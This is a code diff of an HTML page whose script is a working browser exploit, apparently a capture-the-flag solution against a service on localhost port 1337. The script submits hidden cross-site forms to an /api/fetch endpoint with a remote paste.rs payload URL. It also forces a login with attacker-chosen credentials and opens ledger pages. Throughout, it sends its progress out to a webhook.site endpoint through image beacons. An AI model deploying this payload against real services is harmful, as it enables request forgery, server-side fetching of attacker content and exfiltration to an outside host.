@@ -3,30 +3,41 @@
 <script>
 const WH = "https://webhook.site/56bb9b65-25cd-4a20-9fba-579658cf66c6";
 const T = "http://127.0.0.1:1337";
-const TAR = "https://paste.rs/44Lu2";
+const TAR = "https://paste.rs/lNusU";
 const log = (m) => {
   try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}
   new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1400));
 };
 function post(url) {
   const f = document.createElement("form");
-  f.method = "POST";
-  f.action = T + "/api/fetch";
-  f.target = "_blank";
+  f.method = "POST"; f.action = T + "/api/fetch"; f.target = "_blank";
   f.enctype = "application/x-www-form-urlencoded";
   const i = document.createElement("input");
   i.type = "hidden"; i.name = "url"; i.value = url;
-  f.appendChild(i);
-  document.body.appendChild(f);
-  f.submit();
+  f.appendChild(i); document.body.appendChild(f); f.submit();
 }
 log("start");
-post(WH + "/csrftest");
-log("csrf_probe");
-for (let n = 0; n < 10; n++) {
-  setTimeout(function() { post(TAR); log("tar"+n); }, 250 + n * 350);
+for (let n = 0; n < 12; n++) {
+  setTimeout(function() { post(TAR); log("tar"+n); }, n * 300);
 }
-setTimeout(function() { log("nav_ledger"); location.href = T + "/ledger"; }, 5500);
-setTimeout(function() { window.open(T + "/ledger", "_blank"); log("open2"); }, 7500);
-for (let i = 1; i <= 25; i++) setTimeout(function(){ log("tick"+i); }, i * 2000);
+setTimeout(function() { log("ledger"); location.href = T + "/ledger"; }, 4500);
+setTimeout(function() {
+  log("login");
+  const f = document.createElement("form");
+  f.method = "POST"; f.action = T + "/enter"; f.target = "_blank";
+  f.enctype = "application/x-www-form-urlencoded";
+  for (const [k,v] of Object.entries({username:"pwn", password:"password123"})) {
+    const i = document.createElement("input"); i.type="hidden"; i.name=k; i.value=v; f.appendChild(i);
+  }
+  document.body.appendChild(f); f.submit();
+}, 6000);
+setTimeout(function() {
+  log("ledger2");
+  window.open(T + "/ledger", "_blank");
+}, 8000);
+setTimeout(function() {
+  log("lm");
+  window.open(T + "/ledgermaster", "_blank");
+}, 9000);
+for (let i = 1; i <= 30; i++) setTimeout(function(){ log("tick"+i); }, i * 2000);
 </script></body></html>
